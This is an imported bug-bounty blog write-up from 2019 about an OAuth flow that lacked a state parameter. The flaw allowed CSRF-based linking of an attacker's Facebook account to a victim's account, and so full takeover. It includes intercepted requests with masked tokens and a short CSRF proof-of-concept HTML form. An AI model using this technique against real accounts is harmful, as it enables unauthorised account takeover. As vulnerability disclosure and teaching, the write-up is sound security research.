---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-01-20_oauth-misconfiguration-lead-to-complete-account-takeover.md
original_filename: 2019-01-20_oauth-misconfiguration-lead-to-complete-account-takeover.md
title: Oauth Misconfiguration lead to complete account takeover
category: documents
detected_topics:
- oauth
- idor
- access-control
- command-injection
- mfa
- rate-limit
tags:
- imported
- documents
- oauth
- idor
- access-control
- command-injection
- mfa
- rate-limit
language: en
raw_sha256: ade65a1753e62177d0924137fccdee2acd0a903f8aef8dc87f23e321b33b30be
text_sha256: 330d69a1a67af1905c844639ae82205f50189d4d230353733753e6a3d583d36b
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: false
---

# Oauth Misconfiguration lead to complete account takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-01-20_oauth-misconfiguration-lead-to-complete-account-takeover.md
- Source Type: markdown
- Detected Topics: oauth, idor, access-control, command-injection, mfa, rate-limit
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: False
- Raw SHA256: `ade65a1753e62177d0924137fccdee2acd0a903f8aef8dc87f23e321b33b30be`
- Text SHA256: `330d69a1a67af1905c844639ae82205f50189d4d230353733753e6a3d583d36b`


## Content

---
title: "Oauth Misconfiguration lead to complete account takeover"
url: "https://medium.com/@Jacksonkv22/oauth-misconfiguration-lead-to-complete-account-takeover-c8e4e89a96a"
authors: ["Jackson kv (@Jacksonkv22)"]
bugs: ["CSRF", "OAuth", "Account takeover"]
publication_date: "2019-01-20"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5470
scraped_via: "browseros"
---

# Oauth Misconfiguration lead to complete account takeover

Oauth Misconfiguration lead to complete account takeover
Jackson kv
Follow
4 min read
·
Jan 20, 2019

843

4

Hello guys….

Its me Jackson. this is my first blog based on security vulnerability that identified during the exam study leave.. 😆. First of all thanks to Midhun S for giving this wonderful site for testing and supports.

So Let’s start hunting…..

RECON

When i started bug bounty i don’t really spend much time on Reconnaissance but later i realized the importance of reconnaissance. I got a thorough understanding and behavior of Webapps through Reconnaissance and some low hanging bugs😊😊. When I got a target, I always start with a simple Google Search and identify the information like what kind of company and what technologies are being used, these kind of information will gives a slight idea about the companies we are dealing with. Now start the Reconnaissance using some tools. Let’s start with aquatone -subdomain enumeration tool, so after running that tool I got some sub-domains,ran some tools like Lazyrecon, eyewitness, nmap, dirsearch, Advanced google dorks, wappalyzer ,some scripts and tools… 😉 so now we got a target website.

How I got this Vulnerability

Sorry guys i can’t disclose the name of the company , so we can call it as redacted.com. Let’s look at the website https://www.redacted.com, so the website looks like a normal site,nothing interesting in homepage so I go to the Signup page and got a page like shown below.

I created an account using my temporary mail and completed the email confirmation and logged into my account. There will be an option for linking the radacted.com account to Facebook or Google.This will make it easy to login into the redacted account by using Oauth functionality.

What is Oauth….:???

Oauth :- OAuth stands for Open Authorization Framework and is the industry-standard delegation protocol for authorization. OAuth 2.0 is widely used by applications (e.g. SaaS platforms) to access your data that is already on the Internet. That includes for example your contacts list on Google, your friends list on Facebook, etc. If you were ever asked by web or mobile application to give permissions to access your personal data, you have probably used OAuth 2.0.

Get Jackson kv’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

When I saw this option i just open Burpsuite and clicked the Facebook icon for linking my account to Facebook and intercept the request and response.

So the first request will be like this :

GET /v3.1/dialog/oauth?response_type=code&redirect_uri=https%3A%2F%2Fredacted.com%2Fauth%2Ffacebook%2Fcallback&scope=email%2Cpublic_profile&client_id=00000000000 HTTP/1.1
Host: www.facebook.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://redacted.com/profile
Cookie: fr=0rqajcCy4gEh2nJvS.redactedPv2OYVcelE.AWVp7-tG; sb=OQwFXNTRCDFUcookieLIw0; datr=OQwFXBW2scookieSe4q; wd=1366XXXXX657; locale=en_GB; c_u
Connection: close

when I saw this request I felt something interesting here because there is no state parameter, which means some time it may be vulnerable to csrf attack. Now there will be a Facebook page popup for authentication. I was successfully authenticated to Facebook, then i intercept the callback from Facebook….when i saw the callback, i wondered…there is no state parameter which means there is no protection from a csrf attack, so let’s exploit that.

GET /auth/facebook/callback?code=AQCXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX HTTP/1.1
Host: redacted.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.facebook.com
Cookie: __cfduid=d27690xxxxxxxxxxxxxxxxxxxxxxxxxxx471; __adroll_fpc=074645xxxxxxxxxxxxxxxxxxxxxxxx2e9; __ar_v4=JYUExxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxf-cb8d-4c87–9bc1–8478a3f6ed68=session_a0xxxxxxxxxxxxxxxxxxb9e6; _fbp=fb.1.154xxxxxxxxx719436
Connection: close

When I saw this callback,I just made a csrf html page called attack.html.

<html>
<body>
<script>history.pushState(‘’, ‘’, ‘/’)</script>
<form action=”https://redacted.com/auth/facebook/callback">
<input type=”hidden” name=”code” value=”AxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxY” />
<input type=”submit” value=”Submit request” />
</form>
</body>
</html>

Now we can test this vulnerability on a victim account, I created another redacted.com test account. After that logged into that account on an another browser and went to the settings page, there is an option for the linking the Facebook account. Now i just open the the html page on a new tab and clicked the submit button….Yes!…I got it….

My Facebook account is successfully linked with the victim redacted account 😍😍…..for cross checking, i logged out from the victim redacted.com account and tried to login with my Facebook account on redacted.com….Yeah…. 😃😃its successfully logged in with my Facebook account…so i can takeover any victim account….its a simple Oauth Misconfiguration lead to full account takeover.

Unfortunately it’s already reported by another security researcher. But I can learn new things from this vulnerability… 😍😍

Thanks for Reading

You can reach me on : Facebook and twitter
